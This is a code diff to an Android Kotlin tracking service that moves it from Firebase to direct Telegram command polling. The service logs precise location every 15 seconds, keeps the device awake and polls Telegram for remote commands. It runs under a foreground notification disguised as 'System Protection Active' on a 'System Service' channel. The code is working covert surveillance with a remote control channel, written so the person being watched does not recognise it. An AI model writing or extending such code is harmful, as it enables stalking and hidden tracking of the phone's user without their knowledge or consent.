@@ -13,16 +13,16 @@ import android.os.BatteryManager
 import android.os.Build
 import android.os.IBinder
 import android.os.PowerManager
+import android.util.Log
 import androidx.core.app.NotificationCompat
-import com.abuzahra.tracker.MainActivity
-import com.abuzahra.tracker.R
+import com.abuzahra.tracker.LocalStorageManager
 import com.abuzahra.tracker.SharedPrefsManager
+import com.abuzahra.tracker.TelegramDirectClient
 import com.google.android.gms.location.LocationCallback
 import com.google.android.gms.location.LocationRequest
 import com.google.android.gms.location.LocationResult
 import com.google.android.gms.location.LocationServices
 import com.google.android.gms.location.Priority
-import com.google.firebase.firestore.FirebaseFirestore
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -30,80 +30,171 @@ import kotlinx.coroutines.delay
 import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
 
+/**
+ * MainTrackerService - الخدمة الرئيسية لتتبع الجهاز (الإصدار المباشر لتيليجرام)
+ *
+ * المعمارية الجديدة:
+ * 1. تتبع الموقع الجغرافي وحفظه محلياً + إرساله مباشرة لتيليجرام
+ * 2. مراقبة مستوى البطارية
+ * 3. تشغيل استطلاع الأوامر من تيليجرام
+ * 4. تشغيل DataSyncWorker بشكل دوري
+ *
+ * بدون سيرفر وسيط - التطبيق ←→ تيليجرام مباشرة
+ */
 class MainTrackerService : Service() {
+
+    companion object {
+        private const val TAG = "MainTrackerService"
+        private const val NOTIFICATION_ID = 1
+        private const val CHANNEL_ID = "tracker_channel"
+        private const val WAKE_LOCK_TIMEOUT = 10 * 60 * 1000L // 10 دقائق
+    }
+
     private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private var wakeLock: PowerManager.WakeLock? = null
     private lateinit var locationCallback: LocationCallback
 
     override fun onCreate() {
         super.onCreate()
+        Log.d(TAG, "تم إنشاء الخدمة الرئيسية (مباشر تيليجرام)")
         startForegroundServiceNotification()
         acquireWakeLock()
         startLocationUpdates()
         startBatteryMonitor()
+        startTelegramPolling()
     }
 
+    // ==================== ==================== ====================
+    //              إشعار الخدمة (Foreground Notification)
+    // ==================== ==================== ====================
+
     private fun startForegroundServiceNotification() {
-        val channelId = "tracker_channel"
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val chan = NotificationChannel(channelId, "System Service", NotificationManager.IMPORTANCE_LOW)
+            val chan = NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW)
             getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
         }
-        
-        // استخدام أيقونة النظام لتجنب الخطأ
-        val notification: Notification = NotificationCompat.Builder(this, channelId)
+
+        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Protection Active")
-            .setContentText("Service is running in background")
-            .setSmallIcon(android.R.drawable.ic_menu_mylocation) // <--- مصحح
+            .setContentText("Connected to Telegram directly")
+            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
             .setOngoing(true)
             .build()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
         } else {
-            startForeground(1, notification)
+            startForeground(NOTIFICATION_ID, notification)
         }
     }
+
+    // ==================== ==================== ====================
+    //              تتبع الموقع الجغرافي (Location Tracking)
+    // ==================== ==================== ====================
 
     @SuppressLint("MissingPermission")
     private fun startLocationUpdates() {
         val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 15000).build()
+
         locationCallback = object : LocationCallback() {
             override fun onLocationResult(result: LocationResult) {
-                result.lastLocation?.let { updateLocationInFirebase(it) }
+                result.lastLocation?.let { location ->
+                    updateLocation(location)
+                }
             }
         }
-        LocationServices.getFusedLocationProviderClient(this).requestLocationUpdates(locationRequest, locationCallback, mainLooper)
+
+        LocationServices.getFusedLocationProviderClient(this)
+            .requestLocationUpdates(locationRequest, locationCallback, mainLooper)
     }
 
-    private fun updateLocationInFirebase(location: Location) {
-        val parentId = SharedPrefsManager.getParentUid(this) ?: return
-        val deviceId = SharedPrefsManager.getDeviceId(this) ?: return
-        val data = mapOf("location" to mapOf("lat" to location.latitude, "lng" to location.longitude), "last_seen" to System.currentTimeMillis())
-        FirebaseFirestore.getInstance().collection("parents").document(parentId).collection("children").document(deviceId).update(data)
+    /**
+     * تحديث الموقع - يحفظ محلياً فقط (لا يرسل تلقائياً لتجنب الإزعاج)
+     * المدير يطلب الموقع عبر /location
+     */
+    private fun updateLocation(location: Location) {
+        val locationData = mapOf(
+            "latitude" to location.latitude,
+            "longitude" to location.longitude,
+            "accuracy" to location.accuracy.toDouble(),
+            "speed" to location.speed.toDouble(),
+            "altitude" to location.altitude.toDouble(),
+            "timestamp" to location.time,
+            "date_readable" to java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault())
+                .format(java.util.Date(location.time)),
+            "provider" to (location.provider ?: "unknown"),
+            "collected_at" to System.currentTimeMillis()
+        )
+
+        // حفظ الموقع محلياً فقط
+        LocalStorageManager.storeData(this, "location", locationData)
+        Log.d(TAG, "تم حفظ الموقع محلياً: ${location.latitude}, ${location.longitude}")
     }
+
+    // ==================== ==================== ====================
+    //              مراقبة البطارية (Battery Monitor)
+    // ==================== ==================== ====================
 
     private fun startBatteryMonitor() {
         serviceScope.launch(Dispatchers.IO) {
             while (isActive) {
-                val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
-                val batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
-                val parentId = SharedPrefsManager.getParentUid(this@MainTrackerService) ?: return@launch
-                val deviceId = SharedPrefsManager.getDeviceId(this@MainTrackerService) ?: return@launch
-                val data = mapOf("battery_level" to batteryLevel, "is_online" to true)
-                FirebaseFirestore.getInstance().collection("parents").document(parentId).collection("children").document(deviceId).update(data)
-                DataSyncWorker.startImmediate(this@MainTrackerService)
+                try {
+                    val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
+                    val batteryLevel = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
+
+                    SharedPrefsManager.setLastHeartbeat(this@MainTrackerService, System.currentTimeMillis())
+                    Log.d(TAG, "مراقبة البطارية: $batteryLevel%")
+
+                    // تشغيل مزامنة البيانات
+                    DataSyncWorker.startImmediate(this@MainTrackerService)
+
+                } catch (e: Exception) {
+                    Log.e(TAG, "خطأ في مراقبة البطارية: ${e.message}")
+                }
+
+                // انتظار 60 ثانية قبل الجولة التالية
                 delay(60000)
             }
         }
     }
 
+    // ==================== ==================== ====================
+    //         استطلاع الأوامر من تيليجرام (Telegram Polling)
+    // ==================== ==================== ====================
+
+    private fun startTelegramPolling() {
+        serviceScope.launch(Dispatchers.IO) {
+            try {
+                TelegramDirectClient.startCommandPolling(this@MainTrackerService)
+                Log.d(TAG, "تم بدء استطلاع الأوامر من تيليجرام")
+            } catch (e: Exception) {
+                Log.e(TAG, "خطأ في بدء الاستطلاع: ${e.message}", e)
+            }
+        }
+    }
+
+    // ==================== ==================== ====================
+    //              إدارة الطاقة (Power Management)
+    // ==================== ==================== ====================
+
     private fun acquireWakeLock() {
         val powerManager = getSystemService(POWER_SERVICE) as PowerManager
         wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ChildApp::TrackerWakeLock")
-        wakeLock?.acquire(10*60*1000L)
+        wakeLock?.acquire(WAKE_LOCK_TIMEOUT)
     }
-    
-    override fun onDestroy() { wakeLock?.release(); super.onDestroy() }
+
+    override fun onDestroy() {
+        Log.d(TAG, "تم تدمير الخدمة الرئيسية")
+        try {
+            LocationServices.getFusedLocationProviderClient(this)
+                .removeLocationUpdates(locationCallback)
+        } catch (e: Exception) {
+            Log.e(TAG, "خطأ في إيقاف تحديث الموقع: ${e.message}")
+        }
+        TelegramDirectClient.stopCommandPolling()
+        wakeLock?.release()
+        super.onDestroy()
+    }
+
     override fun onBind(intent: Intent?): IBinder? = null
 }
